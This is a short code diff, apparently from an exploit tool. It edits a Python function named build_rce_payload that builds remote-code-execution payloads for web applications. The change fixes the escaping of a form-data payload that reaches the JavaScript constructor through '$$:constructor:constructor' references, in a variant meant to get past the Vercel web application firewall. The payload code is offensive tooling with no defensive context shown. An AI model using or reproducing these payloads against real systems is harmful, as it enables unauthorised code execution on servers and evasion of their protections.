@@ -132,7 +132,7 @@ def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypas
     )
 
     if vercel_waf_bypass:
-        formdata_payload = '"get":"$3:\"$$:constructor:constructor"}'
+        formdata_payload = '{"get":"$3:\\"$$:constructor:constructor"}'
     else:
         formdata_payload = '{"get":"$1:constructor:constructor"}'
 
